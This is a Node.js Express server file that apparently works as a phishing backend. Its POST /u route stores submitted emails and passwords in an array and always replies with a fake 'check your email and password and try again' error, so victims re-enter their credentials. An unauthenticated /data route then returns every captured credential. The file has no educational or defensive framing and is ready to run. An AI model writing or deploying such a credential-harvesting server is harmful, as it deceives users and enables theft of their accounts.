const http = require('http');
const express = require('express');
const app = express();
const path = require('path');
const server = http.createServer(app);

const data=[]
app.use(express.json())
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.resolve("./public")));

app.get('/', function(req, res) {
    try{

    
    return res.sendFile(path.join(__dirname, '/public/index.html'));
    }catch(error){
        res.send(error)
    }
});

app.post('/u',function(req,res){
    try{

    
    const {email,password}=req.body;
    data.push(email,password)
    res.send({message:"CHECK YOUR EMAIL AND PASSWORD AND TRY AGAIN"})
    }catch(error){
        res.send(error)
    }
})

app.get('/data',function(req,res){
    try{

        res.send(data)
    }catch(error){
        res.send(error)
    }
})
// Socket.io
const port = process.env.PORT || 3000;
server.listen(port, function() {
    console.log("Server is listening on port " + port);
});
